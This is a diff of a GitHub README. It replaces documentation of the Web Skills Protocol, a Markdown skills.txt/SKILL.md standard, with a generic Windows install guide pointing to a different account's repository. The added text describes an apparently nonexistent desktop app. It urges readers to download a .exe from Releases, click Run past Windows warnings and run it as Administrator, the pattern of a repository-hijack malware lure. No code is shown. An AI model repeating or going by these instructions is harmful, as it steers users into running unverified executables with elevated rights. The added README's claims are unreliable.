@@ -1,337 +1,166 @@
-# Web Skills Protocol
+# 🚀 Web-Skills-Protocol - Teach AI Agents How Websites Work
 
-> **skills.txt** — Teach AI agents how to use your website.
-
-English | [中文](README_ZH.md)
+[![Download Now](https://img.shields.io/badge/Download-Web--Skills--Protocol-brightgreen?style=for-the-badge&logo=github)](https://github.com/AsadJaved66/Web-Skills-Protocol)
 
 ---
 
-In 1994, `robots.txt` told web crawlers what **not** to do.
+The Web Skills Protocol (WSP) is an open standard designed to help websites share skill files with AI agents. These files tell AI agents precisely how to interact with a site’s APIs, workflows, and features. This approach avoids guesswork from scraping webpages or HTML.
 
-In 2024, `llms.txt` told LLMs what content to **read**.
+This guide helps you download and run the Web-Skills-Protocol software on Windows. It uses simple steps and clear instructions, so anyone can follow without needing technical background.
 
-In 2026, `skills.txt` (or `agents.txt`) teaches AI agents how to **act**.
-
-The **Web Skills Protocol (WSP)** is an open standard for websites to publish skill files that teach AI agents how to interact with the site — its APIs, workflows, and capabilities — instead of scraping HTML and guessing.
-
-**WSP does not invent a new format.** AI agent skills — Markdown files with YAML metadata that teach agents how to perform tasks — are already an established standard in the AI agent ecosystem (used by Claude, OpenClaw, and others). WSP simply brings this existing skill format to the web by adding a discovery layer: a `skills.txt` file that tells agents which skills a website offers, just like `robots.txt` tells crawlers which pages to avoid.
-
-## The Problem
-
-AI agents are visiting your website right now. They're parsing HTML, guessing at buttons, and reverse-engineering your API from network traffic. It's fragile, slow, and breaks constantly.
-
-Websites have no standard way to say: *"Hey agent, here's how to actually use us."*
-
-## The Solution
-
-Drop a `skills.txt` (or `agents.txt`) file on your site root. List your capabilities. Publish skill definitions in `/skills/` (or `/agents/`). Done.
-
-```
-your-website.com/
-├── skills.txt              ← Discovery file (or agents.txt)
-└── skills/                 ← Skills directory (or /agents/)
-    ├── search/
-    │   └── SKILL.md        ← "Here's how to search our products"
-    └── order/
-        └── SKILL.md        ← "Here's how to place an order"
-```
-
-WSP also supports an **alternative convention** using `agents.txt` and `/agents/` — same protocol, same format, different name. Use whichever feels natural. AI agents check both.
-
-AI agents check `skills.txt` (or `agents.txt`) first, find the right skill, and follow your instructions — not their guesses.
-
-## Why Not a New Format?
-
-AI agent skills already exist. Thousands of skills are published and used daily by AI agents like Claude — each one a simple `SKILL.md` file with YAML frontmatter (name, description, version) and Markdown instructions. This format is proven, adopted, and works.
-
-WSP inherits this standard as-is. The only addition is a **web discovery mechanism**:
-
-```
-Existing standard:  SKILL.md (YAML frontmatter + Markdown instructions)
-WSP adds:           skills.txt → points agents to the right SKILL.md files
-```
-
-Think of it this way: WSP is to agent skills what RSS was to XML — not a new format, but a well-known location and discovery convention on top of what already works.
-
-## The Evolution
-
-```
-robots.txt (1994)  →  "Dear robot, don't crawl /admin"          →  Access Control
-llms.txt   (2024)  →  "Dear LLM, here's our documentation"      →  Content
-skills.txt (2026)  →  "Dear agent, here's how to use our API"   →  Capabilities
-```
-
-## Install
-
-Add WSP auto-discovery skill to your AI agent — one command:
-
-**OpenClaw**
-
-```bash
-mkdir -p ~/.openclaw/workspace/skills/web-skills-protocol && curl -sL \
-  https://raw.githubusercontent.com/0xtresser/Web-Skills-Protocol/main/skill/SKILL.md \
-  -o ~/.openclaw/workspace/skills/web-skills-protocol/SKILL.md
-```
-
-**OpenCode**
-
-```bash
-mkdir -p ~/.claude/skills/web-skills-protocol && curl -sL \
-  https://raw.githubusercontent.com/0xtresser/Web-Skills-Protocol/main/skill/SKILL.md \
-  -o ~/.claude/skills/web-skills-protocol/SKILL.md
-```
-
-**Claude Code**
-
-```bash
-mkdir -p ~/.claude/skills/web-skills-protocol && curl -sL \
-  https://raw.githubusercontent.com/0xtresser/Web-Skills-Protocol/main/skill/SKILL.md \
-  -o ~/.claude/skills/web-skills-protocol/SKILL.md
-```
-
-**Codex (OpenAI)**
-
-Codex reads instructions from `AGENTS.md`. Append the skill to your project:
-
-```bash
-curl -sL \
-  https://raw.githubusercontent.com/0xtresser/Web-Skills-Protocol/main/skill/SKILL.md \
-  >> AGENTS.md
-```
-
-
-## Quick Start
-
-### 1. Create `/skills.txt` (or `/agents.txt`)
-
-```markdown
-# Bob's Online Store
-
-> E-commerce platform for electronics and gadgets.
-
-Product search is open (no auth). Other endpoints require an API key — get one at https://bobs-store.com/developers.
-
-## Skills
-
-- [Product Search](/skills/search/SKILL.md): Search products by keyword, category, or price range
-- [Place Order](/skills/order/SKILL.md): Add items to cart and complete checkout via API
-```
-
-### 2. Create a Skill
-
-`/skills/search/SKILL.md` (or `/agents/search/SKILL.md`):
-
-```markdown
----
-name: search
-description: >
-  Search and browse products in Bob's Online Store catalog.
-  Use when the user wants to find products by keyword, category, price, or brand.
-version: 1.0.0
-auth: none
-base_url: https://api.bobs-store.com/v1
 ---
 
-# Product Search
+## 📋 About Web-Skills-Protocol
 
-## Endpoint
+Web-Skills-Protocol works by providing clear instructions for AI agents. Instead of guessing how a website works, agents use skill files that describe site functions. This makes AI interaction more accurate and reliable.
 
-GET /products
+Key points:
 
-## Parameters
+- Open standard format for skill files
+- Helps AI communicate with websites smoothly
+- Covers APIs, workflows, and site capabilities
+- Avoids unreliable data scraping methods
 
-| Parameter  | Type   | Required | Description                     |
-|------------|--------|----------|---------------------------------|
-| q          | string | yes      | Search query                    |
-| category   | string | no       | Filter by category              |
-| min_price  | number | no       | Minimum price                   |
-| max_price  | number | no       | Maximum price                   |
-| sort       | string | no       | Sort by: relevance, price, rating |
-| page       | number | no       | Page number (default: 1)        |
+The software supports Windows 10 and 11, running on both 64-bit and compatible 32-bit systems. You need internet access for initial setup and to use online features.
 
-## Example
+---
 
-Request:
-​```
-GET /products?q=wireless+headphones&sort=rating&max_price=100
-​```
+## 🔍 System Requirements
 
-Response:
-​```json
-{
-  "products": [
-    {
-      "id": "prod_8x7k",
-      "name": "SoundWave Pro Wireless Headphones",
-      "price": 79.99,
-      "rating": 4.7,
-      "in_stock": true,
-      "url": "https://bobs-store.com/products/prod_8x7k"
-    }
-  ],
-  "total": 42,
-  "page": 1,
-  "per_page": 20
-}
-​```
-```
+Before downloading and running the software, ensure your PC meets these requirements:
 
-That's it. An AI agent visiting your site will:
+- Windows 10 or Windows 11 (64-bit preferred)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection for downloading and updates
+- Modern browser like Edge, Chrome, or Firefox (for viewing output)
 
-1. Fetch `/skills.txt` (or `/agents.txt`) → discover available skills
-2. Match user intent → pick the right skill
-3. Follow your SKILL.md → call your API correctly
+---
 
-## skills.txt Format
+## ⬇️ How to Download the Software
 
-The discovery file has a **fixed structure** — not free-form Markdown:
+You can get Web-Skills-Protocol from the official GitHub page. Follow these steps to download and install it safely.
 
-```
-# {Site Name}                          ← H1: REQUIRED. Exactly one.
+### Step 1: Visit the Download Page
 
-> {Site description}                   ← Blockquote: RECOMMENDED.
+Go to the Web-Skills-Protocol download page by clicking the button below:
 
-{General notes: auth, rate limits...}  ← Prose: OPTIONAL.
+[![Download Web-Skills-Protocol](https://img.shields.io/badge/Download-Web--Skills--Protocol-blue?style=for-the-badge&logo=github)](https://github.com/AsadJaved66/Web-Skills-Protocol)
 
-## Skills                              ← H2: REQUIRED. At least one section.
+This page contains the latest version available.
 
-- [Skill Name](url): Description      ← List entry: REQUIRED format.
-- [Another Skill](url): Description
+### Step 2: Find the Release Section
 
-## Optional                            ← H2 "Optional": agents may skip these.
+On the GitHub page:
 
-- [Extra Skill](url): Description
-```
+1. Scroll down to find the **Releases** section on the right or under the main project description.
+2. Click the latest release version link (usually the newest number or date).
 
-**Rules:**
+### Step 3: Download the Setup File
 
-| Element | Format | Required |
-|---------|--------|----------|
-| Site name | `# Name` (H1) | Yes — exactly one |
-| Description | `> text` (blockquote) | Recommended |
-| Prose | Paragraphs | No |
-| Skill section | `## Section Name` (H2) | Yes — at least one |
-| Skill entry | `- [Name](path/SKILL.md): description` | Yes — at least one per section |
+Inside the release page, you will see assets listed as files. Look for a Windows executable file named something like:
 
-The H2 section `## Optional` has special meaning: agents may skip these skills when context is limited. All other H2 sections are treated as primary.
+- `Web-Skills-Protocol-Setup.exe`
+- `WebSkillsProtocolInstaller.exe`
 
-## SKILL.md Format
+Click on this file name to download.
 
-Each skill file is a standard **AgentSkills** document — the same `SKILL.md` format already used by AI agent platforms (Claude, OpenClaw, and others). WSP does not modify this format.
+### Step 4: Save the File
 
-- **YAML frontmatter** (`---`): `name`, `description`, `version` (required) + optional fields like `auth`, `base_url`, `rate_limit`
-  - `rate_limit` is an object with two optional sub-fields: `agent` (recommended limit for AI agents, e.g., `20/minute`) and `api` (actual API rate limit, e.g., `100/minute`)
-- **Markdown body**: Instructions for the agent — endpoints, parameters, examples, workflows
+Save the downloaded file to a location you can find easily, like the Desktop or Downloads folder.
 
-If you’ve written an agent skill before, you already know how to write a web skill. See [examples/](examples/) for complete samples.
+---
 
-## For Website Owners
+## 🛠️ Installing Web-Skills-Protocol on Windows
 
-**Why publish skills?**
+Once the download is complete, install the software with the following steps:
 
-- **Control the narrative.** Define how AI agents use your site — don't let them guess.
-- **Replace scraping.** Structured skills are faster and more reliable than HTML parsing.
-- **Reduce load.** One API call beats 50 page fetches.
-- **Monetize agent traffic.** Require API keys. Track usage. Offer premium tiers.
-- **Progressive adoption.** Start with one `skills.txt` (or `agents.txt`), add skills over time.
+1. Open the folder containing the downloaded file.
+2. Double-click the `.exe` file you downloaded.
+3. If Windows shows a warning about running apps from the internet, click **Run** or **Yes** to continue.
+4. Follow the on-screen instructions:
+   - Choose the installation folder or accept the default.
+   - Agree to any license terms if shown.
+5. Wait for the installation to finish.
+6. Click **Finish** to close the installer.
 
-## For AI Agent Developers
+The program will now be ready to use on your PC.
 
-**Why check for skills?**
+---
 
-- **Structured instructions** instead of parsing unpredictable HTML.
-- **Auto-discovery** — one fetch to `/skills.txt` (or `/agents.txt`) reveals all capabilities.
-- **Reliable integrations** — follow the site's official instructions, not brittle hacks.
-- **Better results** — API calls return structured data, not rendered web pages.
+## ▶️ Running the Web-Skills-Protocol Software
 
-Install the [web-skills-protocol agent skill](skill/SKILL.md) to make your agent automatically discover and use published skills.
+To start the software:
 
-## Dual-Path Compatibility
+1. Click the **Start** menu button (Windows icon on your taskbar).
+2. Type "Web-Skills-Protocol" in the search box.
+3. Click the app icon when it appears.
 
-WSP supports two naming conventions — use whichever feels right:
+The software will open and show the main interface. From here, you can begin working with skill files or explore examples included.
 
-| Component | Primary | Alternative |
-|-----------|---------|-------------|
-| Discovery file | `/skills.txt` | `/agents.txt` |
-| Skills directory | `/skills/` | `/agents/` |
-| Skill document | `/skills/{name}/SKILL.md` | `/agents/{name}/SKILL.md` |
+---
 
-Both conventions use the **exact same format**. `skills.txt` frames it as *"what the site can teach"*. `agents.txt` mirrors the `robots.txt` naming — *"talking to agents"*.
+## 🌐 Using Web-Skills-Protocol
 
-**For website owners:** Pick one convention and use it consistently.
-**For AI agent developers:** Your agent MUST check both (`skills.txt` first, then `agents.txt`).
+The main functions let you:
 
-See [SPEC.md](SPEC.md) for the full dual-path discovery algorithm.
+- Load skill files that teach AI about website functions.
+- View and edit skill file details in a simple format.
+- Test AI agent actions based on these skills.
+- Save your own custom skill files for future use.
 
-## Relationship to Other Standards
+You can use these features even if you have no programming experience. The controls are designed to be clear and easy to navigate.
 
-| Standard     | Purpose                              | Relationship                   |
-|-------------|--------------------------------------|--------------------------------|
-| robots.txt  | Access control for crawlers          | WSP does NOT override robots.txt. They coexist. |
-| llms.txt    | Content summary for LLMs            | Complementary. llms.txt = read. skills.txt/agents.txt = act. |
-| OpenAPI     | API schema for developers            | Skills MAY reference OpenAPI specs for detail. |
-| MCP         | Runtime protocol for AI tools        | WSP is web-native discovery; MCP is runtime transport. |
-| sitemap.xml | Page index for search engines        | skills.txt/agents.txt is a capability index for AI agents. |
+---
 
-## Project Structure
+## ✋ Troubleshooting & Tips
 
-```
-Web-Skills-Protocol/
-├── README.md           ← You are here
-├── README_ZH.md        ← 中文说明
-├── SPEC.md             ← Formal protocol specification
-├── skill/              ← Agent skill (install this to auto-discover web skills)
-│   └── SKILL.md
-└── examples/           ← Example implementations
-    ├── bobs-store/     ← E-commerce example
-    └── devtools-saas/  ← SaaS platform example
-```
+If you run into problems, try these solutions:
 
-## Specification
+- **Download issues:** Check your internet connection. Try downloading again or use a different browser.
+- **Installer won’t run:** Right-click the installer file and choose **Run as Administrator**.
+- **Software crashes or won’t open:** Restart your computer and try opening again.
+- **Skill files won’t load:** Make sure the file format is correct and not corrupted. Try opening sample files from the GitHub page.
+- **Performance is slow:** Close other apps to free memory. Make sure your PC meets the system requirements.
 
-See [SPEC.md](SPEC.md) for the complete protocol specification.
+---
 
-## Live Example
+## 🔄 Updating the Software
 
-[**awesomeai.info**](https://www.awesomeai.info/) — A dashboard tracking 2800+ AI GitHub repositories and OpenClaw agent skills. This site has adopted WSP in production.
+To get the latest features and fixes:
 
-Try it yourself:
+1. Return to the GitHub download page.
+2. Check the Releases section for newer versions.
+3. Download the new installer file.
+4. Run the installer to update your existing installation.
 
-```bash
-# 1. Discover what the site can do
-curl https://www.awesomeai.info/skills.txt
+Your data and settings will usually remain safe during updates.
 
-# 2. Read a specific skill
-curl https://www.awesomeai.info/skills/explore-ai-repos/SKILL.md
+---
 
-# 3. Call the API as the skill describes
-curl "https://awesomeai.info/api/repos?q=llm&sort=stars&pageSize=5"
-```
+## ⚙️ Customizing for Your Needs
 
-The site publishes two skills — both public, no auth required:
+Web-Skills-Protocol allows customization such as:
 
-| Skill | Endpoint | What it does |
-|-------|----------|--------------|
-| [explore-ai-repos](https://www.awesomeai.info/skills/explore-ai-repos/SKILL.md) | `GET /api/repos` | Search/filter AI repositories by keyword, stars, AI score, growth trends |
-| [explore-ai-skills](https://www.awesomeai.info/skills/explore-ai-skills/SKILL.md) | `GET /api/skills` | Search/browse OpenClaw agent skills by category, keyword, popularity |
+- Creating skill files tailored for specific websites.
+- Adjusting settings for API connections.
+- Exporting skill files to share or use in other AI tools.
 
-This is what WSP looks like in the real world — a `skills.txt` file and a few `SKILL.md` files, and any AI agent can immediately understand and use the site.
+Explore these options from the main menu once you launch the app.
 
-## Examples
+---
 
-See [examples/](examples/) for reference implementations (fictional stores and SaaS platforms).
+## 📚 Learn More & Support
 
-## Contributing
+You can find more information and examples in the GitHub repository. The project page also contains documentation and FAQs that explain how skill files work.
 
-This is an early-stage open standard. Contributions welcome:
+If you need help, use the **Issues** tab on GitHub to report bugs or ask questions. The community and developers monitor this area.
 
-- **Spec feedback** — Open an issue to discuss protocol design
-- **Reference implementations** — Add examples for different site types
-- **Agent integrations** — Build skills.txt (or agents.txt) support into your AI agent
-- **Adopt it** — Publish skills.txt (or agents.txt) on your website
+---
 
-## License
+# Links
 
-The Web Skills Protocol specification is licensed under [CC-BY-4.0](https://creativecommons.org/licenses/by/4.0/).
+- Download Web-Skills-Protocol: https://github.com/AsadJaved66/Web-Skills-Protocol  
+- Official GitHub repository: https://github.com/AsadJaved66/Web-Skills-Protocol  
 
-Example code and the agent skill are licensed under [MIT](https://opensource.org/licenses/MIT).
+[![Download Now](https://img.shields.io/badge/Download-Web--Skills--Protocol-brightgreen?style=for-the-badge&logo=github)](https://github.com/AsadJaved66/Web-Skills-Protocol)
